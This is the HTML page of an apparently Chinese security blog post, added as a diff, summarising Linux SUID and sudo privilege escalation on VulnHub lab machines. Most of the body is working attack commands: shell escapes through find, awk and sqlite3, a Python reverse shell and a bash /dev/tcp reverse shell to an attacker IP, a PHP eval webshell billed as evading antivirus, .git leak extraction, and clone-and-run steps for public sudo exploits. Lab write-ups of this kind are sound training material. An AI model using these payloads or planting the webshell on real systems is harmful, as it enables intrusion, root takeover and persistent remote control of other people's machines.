@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SUID &amp; SUDO 提权总结</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@获取到 Web 权限或普通用户在 Linux 服务器上时进行的 SUID &amp; SUDO 提权。">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/2.suid_sudo/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://www.hzhsec.top//index.xml" title="Hzhsec home">
+
+    
+
+
+    <meta property="og:title" content="SUID &amp; SUDO 提权总结" />
+<meta property="og:description" content="获取到 Web 权限或普通用户在 Linux 服务器上时进行的 SUID &amp; SUDO 提权。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/2.suid_sudo/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2025-11-16T18:30:00+08:00" />
+<meta property="article:modified_time" content="2025-11-16T18:30:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SUID &amp; SUDO 提权总结"/>
+<meta name="twitter:description" content="获取到 Web 权限或普通用户在 Linux 服务器上时进行的 SUID &amp; SUDO 提权。"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://www.hzhsec.top/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "SUID \u0026 SUDO 提权总结",
+      "item": "http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/2.suid_sudo/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SUID \u0026 SUDO 提权总结",
+  "name": "SUID \u0026 SUDO 提权总结",
+  "description": "获取到 Web 权限或普通用户在 Linux 服务器上时进行的 SUID \u0026amp; SUDO 提权。\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "获取到 Web 权限或普通用户在 Linux 服务器上时进行的 SUID \u0026 SUDO 提权。\n🔑 基础概念说明 📌 SUID (Set owner User ID up on execution) SUID 是给予文件的一种特殊权限类型。在 Linux / Unix 中，当一个程序运行时会继承执行用户的权限，而 SUID 的作用是让执行者临时继承文件所有者的权限（含 UID、GID）。\n📌 SUDO 权限 SUDO 是由 root 将原本需要超级用户权限才能执行的命令授权给普通用户执行，配置文件为：\n/etc/sudoers 除配置风险外，SUDO 还存在相关漏洞：\nCVE-2019-14287 CVE-2021-3156 CVE-2025-32463 🔗 提权辅助手册参考 https://gtfobins.github.io/ 🟥 SUID 提权 1️⃣ SUID \u0026 GUID — 自带系统程序提权 环境：\nhttps://www.vulnhub.com/entry/dc-1,292/ 开启 NAT 模式 命令运行：SUID GUID 入口来自历史漏洞点\n🔍 查找 SUID / GUID 文件 find / -perm -u=s -type f 2\u003e/dev/null find / -perm -g=s -type f 2\u003e/dev/null 🔎 信息搜集工具：LinEnum \u0026 PEASS-ng 📌 处理脚本换行符\nsed -i 's/\\r$//' LinEnum.sh PEASS-ng 扫描结果：\n🧨 利用 SUID 执行 Shell /usr/bin/find . -exec '/bin/sh' \\; 2️⃣ SUID \u0026 SUDO — 第三方程序提权 环境：\nhttps://www.vulnhub.com/entry/toppo-1,245/ 搭建方式： 创建任意虚拟机 → 替换 toppo.vmdx\n入口思路：端口扫描 + 路径扫描 → 获取 SSH 密码\n📌 Python2 反弹 Shell（利用 SUID）：\n/usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.88.145\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 📌 mawk 也可读取 Root 权限文件\n🟦 SUDO \u0026 SUDO+CVE 提权 1️⃣ 基础 SUDO 配置提权 环境：\nhttps://www.vulnhub.com/entry/toppo-1,245/ 查看 sudo 权限：\ncat /etc/sudoers 无需密码的提权方法：\n/usr/bin/awk 'BEGIN {system(\"/bin/sh\")}' 2️⃣ SUDO-CVE 实战案例 环境：\nhttps://www.vulnhub.com/entry/devguru-1,620/ 🚩 利用思路与流程 🔍 端口及资产识别 80, 8585 http://192.168.139.150/.git/ http://192.168.139.150/adminer.php http://192.168.139.150/backend/ http://192.168.139.150:8585/ http://192.168.139.150:8585/admin 🔑 Git 泄漏利用 python GitHack.py http://192.168.139.150/.git/ 🕹 Web 管理入口 \u0026 Shell 注入 利用 adminer.php 添加用户 → 登录后台 → 模板注入 Shell\nPHP 免杀写 shell point：\nfunction onStart(){ //蚁剑连接 eval($_POST[\"pass\"]); } 📂 备份信息提权突破点 修改密码文件：\n/var/backup/app.ini.bak 登陆 Gitea 数据库\n修改密码 Hash：\n4f6289d97c8e4bb7d06390ee09320a272ae31b07363dbee078dea49e4881cdda50f886b52ed5a89578a0e42cca143775d8cb 🧨 Hook 反弹 Shell bash -c \"exec bash -i \u003e\u0026 /dev/tcp/192.168.88.145/5555 0\u003e\u00261\" 反弹成功图：\n🚀 利用 sudo 提权 — CVE 查看权限：\nsudo -l 发现 sqlite3 免密但 root 不可使用 → 需绕过 root 限制\n绕过方式：\nsudo -u#-1 正常命令：\nsqlite3 /dev/null '.shell /bin/sh' CVE 绕过执行：\nsudo -u#-1 sqlite3 /dev/null '.shell /bin/sh' 🧩 SUDO 漏洞利用合集 📌 CVE-2021-3156 环境： Kali2020 受影响版本：\nsudo: 1.8.2 - 1.8.31p2 sudo: 1.9.0 - 1.9.5p1 检测方式：\nsudoedit -s / POC：\ngit clone https://github.com/blasty/CVE-2021-3156.git cd CVE-2021-3156 make chmod a+x sudo-hax-me-a-sandwich ./sudo-hax-me-a-sandwich 0 📌 CVE-2025-32463 适用版本：\nSudo 1.9.14 ~ 1.9.17 确保 /etc/sudoers 存在 -R 权限\n下载利用脚本：\ngit clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git cd CVE-2025-32463_chwoot 执行：\n/sudo-chwoot.sh 📌 注意\nsudo 利用必须是本地具有一定 sudo 权限的真实用户 WebShell 用户通常不满足条件 而 SUID 不需要此前提 ",
+  "wordCount" : "325",
+  "inLanguage": "en",
+  "datePublished": "2025-11-16T18:30:00+08:00",
+  "dateModified": "2025-11-16T18:30:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/2.suid_sudo/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsec home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://www.hzhsec.top/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/static/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/static/hzhsec.png">
+
+<link rel="manifest" href="/static/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="https://umami-evtq.vercel.app/share/NdRAzdY1AwLB5KF2/hzhsec.github.io">网站统计</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>SUID &amp; SUDO 提权总结</h1>
+  </header>
+
+  <p>
+  <small>
+    November 16, 2025&nbsp;· 325 words&nbsp;· 2 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#-基础概念说明">🔑 基础概念说明</a>
+      <ul>
+        <li><a href="#-suid-set-owner-user-id-up-on-execution">📌 SUID (Set owner User ID up on execution)</a></li>
+        <li><a href="#-sudo-权限">📌 SUDO 权限</a></li>
+      </ul>
+    </li>
+    <li><a href="#-提权辅助手册参考">🔗 提权辅助手册参考</a></li>
+    <li><a href="#-suid-提权">🟥 SUID 提权</a>
+      <ul>
+        <li><a href="#1-suid--guid--自带系统程序提权">1️⃣ SUID &amp; GUID — 自带系统程序提权</a></li>
+        <li><a href="#2-suid--sudo--第三方程序提权">2️⃣ SUID &amp; SUDO — 第三方程序提权</a></li>
+      </ul>
+    </li>
+    <li><a href="#-sudo--sudocve-提权">🟦 SUDO &amp; SUDO+CVE 提权</a>
+      <ul>
+        <li><a href="#1-基础-sudo-配置提权">1️⃣ 基础 SUDO 配置提权</a></li>
+        <li><a href="#2-sudo-cve-实战案例">2️⃣ SUDO-CVE 实战案例</a></li>
+        <li><a href="#-利用思路与流程">🚩 利用思路与流程</a></li>
+      </ul>
+    </li>
+    <li><a href="#-sudo-漏洞利用合集">🧩 SUDO 漏洞利用合集</a>
+      <ul>
+        <li><a href="#-cve-2021-3156">📌 CVE-2021-3156</a></li>
+        <li><a href="#-cve-2025-32463">📌 CVE-2025-32463</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><p>获取到 Web 权限或普通用户在 Linux 服务器上时进行的 SUID &amp; SUDO 提权。</p>
+<hr>
+<h2 id="-基础概念说明">🔑 基础概念说明</h2>
+<h3 id="-suid-set-owner-user-id-up-on-execution">📌 SUID (Set owner User ID up on execution)</h3>
+<p>SUID 是给予文件的一种特殊权限类型。在 Linux / Unix 中，当一个程序运行时会继承执行用户的权限，而 SUID 的作用是让执行者临时继承文件所有者的权限（含 UID、GID）。</p>
+<h3 id="-sudo-权限">📌 SUDO 权限</h3>
+<p>SUDO 是由 <code>root</code> 将原本需要超级用户权限才能执行的命令授权给普通用户执行，配置文件为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/etc/sudoers
+</span></span></code></pre></div><p>除配置风险外，SUDO 还存在相关漏洞：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>CVE-2019-14287
+</span></span><span style="display:flex;"><span>CVE-2021-3156
+</span></span><span style="display:flex;"><span>CVE-2025-32463
+</span></span></code></pre></div><hr>
+<h2 id="-提权辅助手册参考">🔗 提权辅助手册参考</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://gtfobins.github.io/
+</span></span></code></pre></div><hr>
+<h2 id="-suid-提权">🟥 SUID 提权</h2>
+<h3 id="1-suid--guid--自带系统程序提权">1️⃣ SUID &amp; GUID — 自带系统程序提权</h3>
+<p><strong>环境：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://www.vulnhub.com/entry/dc-1,292/
+</span></span></code></pre></div><p>开启 NAT 模式
+命令运行：<code>SUID GUID</code>
+入口来自历史漏洞点</p>
+<p align="center"><img src="/static/屏幕截图 2025-10-27 162652.png" alt="屏幕截图 2025-10-27 162652.png"></p>
+<h4 id="-查找-suid--guid-文件">🔍 查找 SUID / GUID 文件</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>find / -perm -u=s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>find / -perm -g=s -type f 2&gt;/dev/null
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-27 162814.png" alt="屏幕截图 2025-10-27 162814.png"></p>
+<h4 id="-信息搜集工具linenum--peass-ng">🔎 信息搜集工具：LinEnum &amp; PEASS-ng</h4>
+<p>📌 处理脚本换行符</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sed -i &#39;s/\r$//&#39; LinEnum.sh
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-27 163516.png" alt="屏幕截图 2025-10-27 163516.png"></p>
+<p>PEASS-ng 扫描结果：</p>
+<p align="center"><img src="/static/屏幕截图 2025-10-27 164016.png" alt="屏幕截图 2025-10-27 164016.png"></p>
+<h4 id="-利用-suid-执行-shell">🧨 利用 SUID 执行 Shell</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/usr/bin/find . -exec &#39;/bin/sh&#39; \;
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-27 164227.png" alt="屏幕截图 2025-10-27 164227.png"></p>
+<hr>
+<h3 id="2-suid--sudo--第三方程序提权">2️⃣ SUID &amp; SUDO — 第三方程序提权</h3>
+<p><strong>环境：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://www.vulnhub.com/entry/toppo-1,245/
+</span></span></code></pre></div><p>搭建方式：
+创建任意虚拟机 → 替换 <code>toppo.vmdx</code></p>
+<p>入口思路：端口扫描 + 路径扫描 → 获取 SSH 密码</p>
+<p align="center"><img src="/static/屏幕截图 2025-10-27 172006.png" alt="屏幕截图 2025-10-27 172006.png"></p>
+<p>📌 Python2 反弹 Shell（利用 SUID）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/usr/bin/python2.7 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.88.145&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-27 172006.png" alt="屏幕截图 2025-10-27 172006.png"></p>
+<p align="center"><img src="/static/屏幕截图 2025-10-27 172352.png" alt="屏幕截图 2025-10-27 172352.png"></p>
+<p>📌 <code>mawk</code> 也可读取 Root 权限文件</p>
+<p align="center"><img src="/static/屏幕截图 2025-10-27 172839.png" alt="屏幕截图 2025-10-27 172839.png"></p>
+<hr>
+<h2 id="-sudo--sudocve-提权">🟦 SUDO &amp; SUDO+CVE 提权</h2>
+<h3 id="1-基础-sudo-配置提权">1️⃣ 基础 SUDO 配置提权</h3>
+<p><strong>环境：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://www.vulnhub.com/entry/toppo-1,245/
+</span></span></code></pre></div><p>查看 sudo 权限：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cat /etc/sudoers
+</span></span></code></pre></div><p>无需密码的提权方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/usr/bin/awk &#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39;
+</span></span></code></pre></div><hr>
+<h3 id="2-sudo-cve-实战案例">2️⃣ SUDO-CVE 实战案例</h3>
+<p><strong>环境：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://www.vulnhub.com/entry/devguru-1,620/
+</span></span></code></pre></div><hr>
+<h3 id="-利用思路与流程">🚩 利用思路与流程</h3>
+<h4 id="-端口及资产识别">🔍 端口及资产识别</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>80, 8585
+</span></span><span style="display:flex;"><span>http://192.168.139.150/.git/
+</span></span><span style="display:flex;"><span>http://192.168.139.150/adminer.php
+</span></span><span style="display:flex;"><span>http://192.168.139.150/backend/
+</span></span><span style="display:flex;"><span>http://192.168.139.150:8585/
+</span></span><span style="display:flex;"><span>http://192.168.139.150:8585/admin
+</span></span></code></pre></div><h4 id="-git-泄漏利用">🔑 Git 泄漏利用</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python GitHack.py http://192.168.139.150/.git/
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-27 174328.png" alt="屏幕截图 2025-10-27 174328.png"></p>
+<h4 id="-web-管理入口--shell-注入">🕹 Web 管理入口 &amp; Shell 注入</h4>
+<p>利用 adminer.php 添加用户 → 登录后台 → 模板注入 Shell</p>
+<p align="center"><img src="/static/屏幕截图 2025-10-27 174333.png" alt="屏幕截图 2025-10-27 174333.png"></p>
+<p align="center"><img src="/static/屏幕截图 2025-10-27 174425.png" alt="屏幕截图 2025-10-27 174425.png"></p>
+<p align="center"><img src="/static/屏幕截图 2025-10-27 180638.png" alt="屏幕截图 2025-10-27 180638.png"></p>
+<p>PHP 免杀写 shell point：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>function onStart(){
+</span></span><span style="display:flex;"><span>//蚁剑连接
+</span></span><span style="display:flex;"><span>eval($_POST[&#34;pass&#34;]);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="-备份信息提权突破点">📂 备份信息提权突破点</h4>
+<p align="center"><img src="/static/屏幕截图 2025-10-27 181358.png" alt="屏幕截图 2025-10-27 181358.png"></p>
+<p>修改密码文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/var/backup/app.ini.bak
+</span></span></code></pre></div><p>登陆 Gitea 数据库</p>
+<p align="center"><img src="/static/屏幕截图 2025-10-27 181531.png" alt="屏幕截图 2025-10-27 181531.png"></p>
+<p>修改密码 Hash：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>4f6289d97c8e4bb7d06390ee09320a272ae31b07363dbee078dea49e4881cdda50f886b52ed5a89578a0e42cca143775d8cb
+</span></span></code></pre></div><h4 id="-hook-反弹-shell">🧨 Hook 反弹 Shell</h4>
+<p align="center"><img src="/static/屏幕截图 2025-10-27 190144.png" alt="屏幕截图 2025-10-27 190144.png"></p>
+<p align="center"><img src="/static/屏幕截图 2025-10-27 190151.png" alt="屏幕截图 2025-10-27 190151.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>bash -c &#34;exec bash -i &gt;&amp; /dev/tcp/192.168.88.145/5555 0&gt;&amp;1&#34;
+</span></span></code></pre></div><p>反弹成功图：</p>
+<p align="center"><img src="/static/屏幕截图 2025-10-27 190259.png" alt="屏幕截图 2025-10-27 190259.png"></p>
+<hr>
+<h4 id="-利用-sudo-提权--cve">🚀 利用 sudo 提权 — CVE</h4>
+<p>查看权限：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-27 194253.png" alt="屏幕截图 2025-10-27 194253.png"></p>
+<p>发现 <code>sqlite3</code> 免密但 root 不可使用 → 需绕过 root 限制</p>
+<p>绕过方式：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo -u#-1
+</span></span></code></pre></div><p>正常命令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sqlite3 /dev/null &#39;.shell /bin/sh&#39;
+</span></span></code></pre></div><p>CVE 绕过执行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo -u#-1 sqlite3 /dev/null &#39;.shell /bin/sh&#39;
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-27 194722.png" alt="屏幕截图 2025-10-27 194722.png"></p>
+<hr>
+<h2 id="-sudo-漏洞利用合集">🧩 SUDO 漏洞利用合集</h2>
+<h3 id="-cve-2021-3156">📌 CVE-2021-3156</h3>
+<p><strong>环境</strong>： Kali2020
+<strong>受影响版本：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo: 1.8.2 - 1.8.31p2
+</span></span><span style="display:flex;"><span>sudo: 1.9.0 - 1.9.5p1
+</span></span></code></pre></div><p>检测方式：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudoedit -s /
+</span></span></code></pre></div><p>POC：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>git clone https://github.com/blasty/CVE-2021-3156.git
+</span></span><span style="display:flex;"><span>cd CVE-2021-3156
+</span></span><span style="display:flex;"><span>make
+</span></span><span style="display:flex;"><span>chmod a+x sudo-hax-me-a-sandwich
+</span></span><span style="display:flex;"><span>./sudo-hax-me-a-sandwich 0
+</span></span></code></pre></div><hr>
+<h3 id="-cve-2025-32463">📌 CVE-2025-32463</h3>
+<p>适用版本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Sudo 1.9.14 ~ 1.9.17
+</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-26 165525.png" alt="屏幕截图 2025-10-26 165525.png"></p>
+<p>确保 <code>/etc/sudoers</code> 存在 <code>-R</code> 权限</p>
+<p>下载利用脚本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git
+</span></span><span style="display:flex;"><span>cd CVE-2025-32463_chwoot
+</span></span></code></pre></div><p>执行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/sudo-chwoot.sh
+</span></span></code></pre></div><p align="center"><img src="/static/Screenshot_2025-10-26_05_03_14.png" alt="Screenshot_2025-10-26_05_03_14.png"></p>
+<p>📌 注意</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo 利用必须是本地具有一定 sudo 权限的真实用户
+</span></span><span style="display:flex;"><span>WebShell 用户通常不满足条件
